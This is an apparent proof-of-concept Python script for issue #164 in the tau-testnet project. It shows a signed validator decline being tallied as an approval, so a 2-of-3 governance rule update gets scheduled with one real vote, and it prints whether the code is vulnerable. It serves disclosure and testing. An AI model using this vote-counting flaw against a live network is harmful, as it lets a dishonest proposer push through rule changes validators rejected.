"""PoC — IDNI/tau-testnet issue #164.

A governance rule update reaches quorum with fewer real approvals than the
threshold requires, because a validator's signed DECLINE is tallied as an
APPROVAL on the block-apply path.

Scenario
--------
3 validators, approval threshold 2 (2-of-3).
Proposal: rule update activating at height 10.

  V1  -> signs approve=true    (1 genuine approval)
  V2  -> never votes
  V3  -> signs approve=false   (an explicit NO, e.g. from a wallet "reject" button)

The dishonest block proposer puts both votes in one block.  On vulnerable code
the manager promotes the update: V3's NO supplied the second "approval".

Expected (correct): update stays pending, 1/2 approvals.
Actual  (buggy)   : update is scheduled for activation with 1 real approval.

No native tau engine, no node, no network.
Deps: blake3, py_arkworks_bls12381.
"""
import sys

from consensus.governance import (
    ConsensusLifecycleManager,
    ConsensusRuleUpdate,
    ConsensusRuleVote,
)

V1 = bytes.fromhex(f"{1:096x}")
V2 = bytes.fromhex(f"{2:096x}")
V3 = bytes.fromhex(f"{3:096x}")

manager = ConsensusLifecycleManager(active_validators=[V1, V2, V3])
threshold = manager.approval_threshold
print(f"validators=3  approval_threshold={threshold}  (2-of-3)\n")

update = ConsensusRuleUpdate(
    rule_revisions=["o1[t]:bv[8]", "o2[t]:bv[8]", "[o2[t] = o1[t]]"],
    activate_at_height=10,
)
assert manager.submit_update(update), "proposal not accepted"
uid = update.update_id
print("proposal:", uid.hex()[:24], "...  activation height 10\n")

# Three validators sign. V3 explicitly declines.
votes = [
    ("V1", V1, True,  "approve"),
    ("V3", V3, False, "DECLINE"),
]

for name, pk, approve, label in votes:
    vote = ConsensusRuleVote(update_id=uid, approve=approve)
    admitted = manager.can_admit_vote(vote, pk, is_mempool=False)
    counted = manager.submit_vote(vote, pk)
    print(f"block: {name} {label:<8} admitted={admitted} counted_in_tally={counted}")

tally = len(manager.votes.get(uid, ()))
pending = uid in manager.pending_updates
scheduled = [entry for entry in manager.scheduled_updates if entry[1] == uid]

print()
print(f"genuine approvals : 1")
print(f"declines          : 1")
print(f"tally used by code: {tally}")
print(f"still pending     : {pending}")
print(f"scheduled         : {bool(scheduled)}  {scheduled}")
print()

# The control: the mempool refuses the very same decline vote.
control = ConsensusLifecycleManager(active_validators=[V1, V2, V3])
control.submit_update(update)
mempool_admits = control.can_admit_vote(
    ConsensusRuleVote(update_id=uid, approve=False), V3, is_mempool=True
)
print(f"control: mempool admits the same decline vote? {mempool_admits}")
print()

if scheduled and not pending:
    print("RESULT: VULNERABLE — the update is scheduled for activation at height 10")
    print("        with ONE genuine approval; V3's signed NO was counted as a YES.")
    sys.exit(1)

print("RESULT: SAFE — the decline contributed nothing; update still pending (1/2).")
sys.exit(0)
